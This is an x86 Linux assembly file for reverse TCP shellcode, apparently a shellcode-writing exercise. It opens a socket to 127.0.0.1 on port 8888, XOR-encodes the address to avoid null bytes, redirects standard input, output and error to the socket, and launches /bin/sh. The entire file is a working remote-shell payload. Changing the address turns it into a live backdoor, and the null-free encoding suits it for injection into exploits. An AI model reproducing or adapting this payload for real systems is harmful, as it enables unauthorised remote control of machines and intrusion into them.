; Shell Reverse TCP

global _start

_start:

	; clean registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; syscall socketcall
	mov al, 102 ; socketcall
	mov bl, 1   ; SYS_SOCKET
	push ecx    ; push 0 to the stack
	push ebx    ; push 1 to the stack
	push 2      ; push 2 to the stack : AF_INET = 2
	mov ecx, esp
	int 0x80
	mov edi, eax

	; initialization of struct
	; serv_addr.sin_family = AF_INET;
	; serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	; serv_addr.sin_port = htons(8888);
	; using xor to remove null byte
	mov eax, 0xaaaaaaaa   ; xor key
	mov ebx, 0xabaaaad5   ; xored 127.0.0.1
	xor eax, ebx
	push eax
	push word 0xb822      ; port 8888
	push word 2           ; AF_INET
	mov ecx, esp          ; store our 3 arguments from stack in ecx

	; syscall socketcall SYS_CONNECT
	; connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	xor eax, eax  ; clean register
	xor ebx, ebx  ; clean register
	mov al, 102   ; socketcall
	mov bl, 3     ; SYS_CONNECT
	push 0x10     ; size 16
	push ecx      ; push the struct of args
	push edi      ; push the sock return value
	mov ecx, esp	; stack contains our 3 arguments
	int 0x80

	; dup2 stdin syscall
	; dup2(sock, 0);
	xor ecx, ecx 		; clean ecx
	mov al, 63			; dup2
	; we don't push 0, since ecx is already NULL from the xor
	push edi			; first argument: sock
	int 0x80			; syscall

	; dup2 stdout syscall
	; dup2(sock, 1);
	mov al, 63			; dup2
	mov cl, 1			; stdout
	push edi			; first argument: sock
	int 0x80			; syscall

	; dup2 stderr syscall
	; dup2(sock, 2);
	mov al, 63			; dup2
	mov cl, 2			; stderr
	push edi			; first argument: sock
	int 0x80			; syscall

	; execve syscall
	; execve("/bin/sh", NULL, NULL);
	xor eax, eax		; clean registers
	push eax			; push eax to the top of the stack
	push 0x68732f2f		; push 8 bytes //bin/sh
	push 0x6e69622f
	mov ebx, esp		; //bin/sh in ebx
	mov ecx, eax		; null in ecx
	mov edx, eax		; null in edx
	mov al, 11			; execve
	int 0x80			  ; syscall
